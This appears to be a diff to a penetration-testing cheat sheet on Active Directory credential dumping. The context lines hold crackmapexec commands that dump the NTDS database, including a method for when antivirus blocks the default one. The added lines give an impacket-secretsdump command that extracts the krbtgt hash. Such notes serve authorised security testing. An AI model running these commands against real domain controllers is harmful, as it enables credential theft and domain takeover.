@@ -185,6 +185,9 @@ sudo crackmapexec smb <target> --kerberos --ntds drsuapi
 
 # Antivirus blocking default drsuapi method, try vss method instead
 sudo crackmapexec smb <target> -u <domain_admin> -p '<pass>' --ntds vss
+
+# dump krbgt hash only
+impacket-secretsdump <domain>/<domain_admin>:'<pass>'@<target> -history -just-dc -just-user krbgt
 ```
 
 ### Manual Dump
